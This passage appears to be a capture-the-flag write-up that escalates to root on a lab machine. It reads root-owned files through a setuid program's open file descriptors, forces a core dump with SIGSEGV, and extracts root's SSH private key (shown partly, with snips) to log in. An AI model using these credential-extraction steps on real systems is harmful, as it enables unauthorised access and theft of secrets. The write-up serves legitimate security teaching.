dasith@secret:/opt$ ./count           
Enter source file/directory name: /root/.profile

Total characters = 161
Total words      = 39
Total lines      = 10
Save results a file? [y/N]: ^Z
[1]+  Stopped                 ./count
dasith@secret:/opt$ ps auxww | grep ./count
dasith      1551  0.0  0.0   2488   592 pts/0    T    16:26   0:00 ./count
dasith      1553  0.0  0.0   6432   740 pts/0    S+   16:27   0:00 grep --color=auto ./count
dasith@secret:/opt$ head /proc/1551/fd/3
# ~/.profile: executed by Bourne-compatible login shells.

if [ "$BASH" ]; then
  if [ -f ~/.bashrc ]; then
    . ~/.bashrc
  fi
fi

mesg n 2> /dev/null || true

```

#### Find SSH Key

I’ll note that `.viminfo` is readable in `/root`. This is a file that supports the `vim` text editor, and can include history. I’ll use the same trick to read it:

```

Enter source file/directory name: /root/.viminfo

Total characters = 16370
Total words      = 2228
Total lines      = 562
Save results a file? [y/N]: ^Z
[1]+  Stopped                 ./count
dasith@secret:/opt$ pidof count
1557                                    
dasith@secret:/opt$ cat /proc/1557/fd/3
# This viminfo file was generated by Vim 8.1.
# You may edit it if you're careful!
...[snip]...
# Registers:
""0     LINE    0
        -----BEGIN OPENSSH PRIVATE KEY-----
        b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
        NhAAAAAwEAAQAAAYEAn6zLlm7QOGGZytUCO3SNpR5vdDfxNzlfkUw4nMw/hFlpRPaKRbi3
        KUZsBKygoOvzmhzWYcs413UDJqUMWs+o9Oweq0viwQ1QJmVwzvqFjFNSxzXEVojmoCePw+
...[snip]...
        xhDYPO15YxLBhWJ0J3G9v6SN/YH3UYj47i4s0zk6JZMnVGTfCwXOxLgL/w5WJMelDW+l3k
        fO8ebYddyVz4w9AAAADnJvb3RAbG9jYWxob3N0AQIDBA==
        -----END OPENSSH PRIVATE KEY-----
...[snip]...

```

There’s an SSH key!

### Exploit Crash Dump

#### Generate Dump

There’s a comment in the source `// Enable coredump generation`. That’s a good hint to try generating a crash of the process. When a program crashes, the system stores the crash dump files [in](https://refspecs.linuxfoundation.org/FHS_2.3/fhs-2.3.html#VARCRASHSYSTEMCRASHDUMPS) `/var/crash`. There’s actually already two there:

```

dasith@secret:/var/crash$ ls -l                   
total 52                                                                                                 
-rw-r----- 1 root root 27203 Oct  6 18:01 _opt_count.0.crash
-rw-r----- 1 root root 24048 Oct  5 14:24 _opt_countzz.0.crash

```

These are dated from back before this box released, so they are likely the developer playing with the `count` (and `countzz`?) program.

The plan is to start the program, have it read something interesting I want to read, and then cause it to crash. When I listed `/root` earlier, there was a `.ssh` directory. Looking in that directory (with `count`) shows there’s an `id_rsa` file. I’ll try to read that.

First I’ll start count and read the file:

```

dasith@secret:/opt$ ./count
Enter source file/directory name: /root/.ssh/id_rsa
                                                    
Total characters = 2602
Total words      = 45
Total lines      = 39                    
Save results a file? [y/N]:

```

Waiting for my input, I’ll Ctrl-z to background the process:

```

Save results a file? [y/N]: ^Z
[1]+  Stopped                 ./count     
dasith@secret:/opt$ 

```

Now I’ll get the pid of the process, which in this case is 1384:

```

dasith@secret:/var/crash$ ps                
    PID TTY          TIME CMD
   1371 pts/0    00:00:00 sh
   1372 pts/0    00:00:00 bash
   1384 pts/0    00:00:00 count
   1403 pts/0    00:00:00 ps

```

The `kill` command is typically associated with killing processes, but [what it actually does](https://linux.die.net/man/1/kill) is send a specified signal to a process, and the default signal is `TERM` (making the default behavior to kill the process). `kill -l` will show all the possible signals:

```

dasith@secret:/var/crash$ kill -l
 1) SIGHUP       2) SIGINT       3) SIGQUIT      4) SIGILL       5) SIGTRAP
 6) SIGABRT      7) SIGBUS       8) SIGFPE       9) SIGKILL     10) SIGUSR1
11) SIGSEGV     12) SIGUSR2     13) SIGPIPE     14) SIGALRM     15) SIGTERM
16) SIGSTKFLT   17) SIGCHLD     18) SIGCONT     19) SIGSTOP     20) SIGTSTP
21) SIGTTIN     22) SIGTTOU     23) SIGURG      24) SIGXCPU     25) SIGXFSZ
26) SIGVTALRM   27) SIGPROF     28) SIGWINCH    29) SIGIO       30) SIGPWR
31) SIGSYS      34) SIGRTMIN    35) SIGRTMIN+1  36) SIGRTMIN+2  37) SIGRTMIN+3
38) SIGRTMIN+4  39) SIGRTMIN+5  40) SIGRTMIN+6  41) SIGRTMIN+7  42) SIGRTMIN+8
43) SIGRTMIN+9  44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12 47) SIGRTMIN+13
48) SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14 51) SIGRTMAX-13 52) SIGRTMAX-12
53) SIGRTMAX-11 54) SIGRTMAX-10 55) SIGRTMAX-9  56) SIGRTMAX-8  57) SIGRTMAX-7
58) SIGRTMAX-6  59) SIGRTMAX-5  60) SIGRTMAX-4  61) SIGRTMAX-3  62) SIGRTMAX-2
63) SIGRTMAX-1  64) SIGRTMAX

```

`SIGSEGV` is the signal to send a [segmentation fault](https://en.wikipedia.org/wiki/Segmentation_fault), which will crash the program. I’ll send it, and then resume the program with `fg`:

```

dasith@secret:/opt$ kill -SIGSEGV 1384
dasith@secret:/var/crash$ fg
./count (wd: /opt)
Segmentation fault (core dumped)

```

There’s a new file in `/var/crash`:

```

dasith@secret:/var/crash$ ls -l /var/crash/
total 84
-rw-r----- 1 root   root   27203 Oct  6 18:01 _opt_count.0.crash
-rw-r----- 1 dasith dasith 31329 Mar 24 12:31 _opt_count.1000.crash
-rw-r----- 1 root   root   24048 Oct  5 14:24 _opt_countzz.0.crash

```

#### Read File from Dump

The `.crash` file is actually text:

```

dasith@secret:/var/crash$ file _opt_count.1000.crash
_opt_count.1000.crash: ASCII text, with very long lines
dasith@secret:/var/crash$ cat _opt_count.1000.crash
ProblemType: Crash
Architecture: amd64
Date: Thu Mar 24 12:31:05 2022
DistroRelease: Ubuntu 20.04
ExecutablePath: /opt/count
ExecutableTimestamp: 1633601037
ProcCmdline: ./count
ProcCwd: /opt
ProcEnviron:
SHELL=/bin/sh
LANG=en_US.UTF-8
PATH=(custom, no user)
ProcMaps:
55ff65e08000-55ff65e09000 r--p 00000000 fd:00 393236                     /opt/count
55ff65e09000-55ff65e0a000 r-xp 00001000 fd:00 393236                     /opt/count
55ff65e0a000-55ff65e0b000 r--p 00002000 fd:00 393236                     /opt/count
55ff65e0b000-55ff65e0c000 r--p 00002000 fd:00 393236                     /opt/count
...[snip]...
 ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
 ProcStatus:
 Name:  count
 Umask: 0022
 State: S (sleeping)
 Tgid:  1384
 Ngid:  0
 Pid:   1384
 PPid:  1372
 TracerPid:     0
 Uid:   1000    1000    1000    1000
 Gid:   1000    1000    1000    1000
 ...[snip]...
Uname: Linux 5.4.0-89-generic x86_64
UserGroups: N/A
CoreDump: base64
 H4sICAAAAAAC/0NvcmVEdW1wAA==
 7Z0HYFvF/cefbCdxDEkMJJBAANEC/4BJ...[snip]...

```

It has all kinds of information about the process at the time of the crash, and a large base-64 encoded blob at the end.

`apport-unpack` will decompress the dump into a given directory:

```

dasith@secret:/var/crash$ apport-unpack _opt_count.1000.crash /tmp/0xdf
dasith@secret:/var/crash$ ls /tmp/0xdf/
Architecture         ExecutableTimestamp  ProcMaps
CoreDump             ProblemType          ProcStatus
Date                 ProcCmdline          Signal
DistroRelease        ProcCwd              Uname
ExecutablePath       ProcEnviron          UserGroups 

```

`file` shows `CoreDump` as an ELF binary:

```

dasith@secret:/tmp/0xdf$ file CoreDump 
CoreDump: ELF 64-bit LSB core file, x86-64, version 1 (SYSV), SVR4-style, from './count', real uid: 1000, effective uid: 0, real gid: 1000, effective gid: 1000, execfn: './count', platform: 'x86_64'

```

That’s because it’s the memory of the process at the time of the crash. Running strings on it will return the file:

```

dasith@secret:/tmp/0xdf$ strings -n 30 CoreDump                       
/usr/lib/x86_64-linux-gnu/libc-2.31.so
...[snip]...
Save results a file? [y/N]: l words      = 45                                                            
-----BEGIN OPENSSH PRIVATE KEY-----           
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn          
NhAAAAAwEAAQAAAYEAn6zLlm7QOGGZytUCO3SNpR5vdDfxNzlfkUw4nMw/hFlpRPaKRbi3
KUZsBKygoOvzmhzWYcs413UDJqUMWs+o9Oweq0viwQ1QJmVwzvqFjFNSxzXEVojmoCePw+
...[snip]...
fO8ebYddyVz4w9AAAADnJvb3RAbG9jYWxob3N0AQIDBA==
-----END OPENSSH PRIVATE KEY-----
...[snip]...

```

### SSH

With the SSH key, I can SSH into the box as root:

```

oxdf@hacky$ ssh -i ~/keys/secret-root root@10.10.11.120
...[snip]...
root@secret:~#

```

And read `root.txt`:

```

root@secret:~# cat root.txt
fd1c20cd************************

```